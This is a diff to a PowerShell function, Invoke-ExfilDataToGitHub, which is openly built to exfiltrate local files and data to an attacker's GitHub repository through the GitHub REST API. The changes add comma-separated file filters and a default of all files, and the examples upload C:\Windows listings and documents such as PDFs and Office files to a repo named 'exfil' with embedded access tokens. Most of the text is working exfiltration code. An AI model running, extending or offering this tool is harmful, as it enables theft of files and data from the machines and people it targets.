@@ -5,7 +5,7 @@ function Invoke-ExfilDataToGitHub
 
 .SYNOPSIS 
 Use this script to exfiltrate data and files to a GitHub account. 
-Using GitHub REST API v3 tutorial here 
+Using GitHub v3 REST API tutorial here 
 https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell
 
 
@@ -30,7 +30,8 @@ Local file path of files to upload
 GitHub filename eg. testfile.txt
 
 .PARAMETER Filter
-Local file filter eg. *.* to get all files or *.pdf for all pdfs
+Local file filter eg. '*.*' to get all files, '*.pdf' for all pdfs, or 'file.txt, file2.docx' to get a comma-delimited list of files from that dirctory. 
+Defaults'
 
 .PARAMETER Data
 Data to write to file
@@ -43,12 +44,18 @@ Recursively get files from subdirectories of given local filepath
 .EXAMPLE
 # This example exfiltrates data to a file - keys do not work
 
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0Mzll==" 
-                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -Data (dir c:\Windows | Out-String )
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
+                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -Data (dir c:\windows | Out-String )
 .EXAMPLE
 # This example exfiltrates files from a given directory and filter
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0Mzll=="
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ=="
    -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.pdf"
+
+
+.EXAMPLE
+# This examples exfiltrates specific files from a given directory
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
+    -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "play.pptx, test.pub, blank.docx" -Recurse 
 
 #>
 
@@ -80,7 +87,7 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
         [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilFilesFromFilePath")]
         [String]
-        $Filter,
+        $Filter = "*.*",
 
         [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
         [String]
@@ -127,11 +134,11 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
          # If we get here that means we were able to get the contents so get hold of the sha
         $sha = $content.sha
-        #Write-Host $sha
+        #Write-Error $sha
     }
     Catch {        
         $ErrorMessage = $_.Exception.Message;
-        #Write-Host "Trying to get file contents: " + $ErrorMessage; # remove in production
+        #Write-Error "Trying to get file contents: " + $ErrorMessage; # remove in production
     }
 
    
@@ -152,7 +159,7 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         }
         catch{
             $ErrorMessage = $_.Exception.Message;
-            #Write-Host "Trying to delete file: " + $ErrorMessage; #remove in production
+            #Write-Error "Trying to delete file: " + $ErrorMessage; #remove in production
         }
     } 
 
@@ -166,11 +173,11 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
        
         try{            
             $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
-            #Write-Host "Successfully uploaded file!"
+            #Write-Error "Successfully uploaded file!"
         }
         catch{
             $ErrorMessage = $_.Exception.Message;
-            #Write-Host "Trying to create file: " + $ErrorMessage;
+            #Write-Error "Trying to create file: " + $ErrorMessage;
             #exit
         }    
 
@@ -194,16 +201,23 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
     if ($LocalFilePath[-1] -ne "\") { $LocalFilePath += "\" }
 
 
-    # Check if files should be recursively retrieved 
-    if ($Recurse -eq $True){
-        $files  = Get-ChildItem -Recurse ($LocalFilePath + $Filter)
-    }
-    else {
-        $files = Get-ChildItem ($LocalFilePath + $Filter)
+    # Get the collection of files from the filter
+    #if ($Files) { $Files.Clear() }
+    $Files = @()
+
+    $Filters = $Filter.Split(',')
+    
+    ForEach ($fil in $Filters) { 
+
+        # Check if files should be recursively retrieved 
+        if ($Recurse -eq $True){
+            Get-ChildItem -Recurse ($LocalFilePath + $fil.Trim()) | ForEach-Object { $Files += $_ }
+        }
+        elseif ($Recurse -eq $False) {
+            Get-ChildItem ($LocalFilePath + $fil.Trim()) | ForEach-Object { $Files += $_ } 
+        }
     }
 
-
-    #write-host $files
 
     ForEach ($file in $Files){
 
@@ -226,7 +240,7 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
             }
             Catch {      
                 $ErrorMessage = $_.Exception.Message;
-                #Write-Host "Trying to get file contents: " + $ErrorMessage;
+                #Write-Error "Trying to get file contents: " + $ErrorMessage;
             }
 
             # Delete the file if it already exists
@@ -243,7 +257,7 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                 }
                 catch{
                     $ErrorMessage = $_.Exception.Message;
-                    #Write-Host "Trying to delete file: " + $ErrorMessage;
+                    #Write-Error "Trying to delete file: " + $ErrorMessage;
                 }
             } 
 
@@ -262,12 +276,12 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
             } | ConvertTo-Json
             
             $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
-            #Write-Host "Successfully uploaded file!"
+            #Write-Error "Successfully uploaded file!"
 
         }
         Catch {
             $ErrorMessage = $_.Exception.Message;
-            #Write-Host "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
+            #Write-Error "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
             #exit
         }
 
@@ -278,9 +292,3 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
 #endregion
 
 }
-
-# Examples - keys do not work
-
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDN==" -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "*.*" -Recurse
-
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDN==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -Data (dir c:\Windows | Out-String )
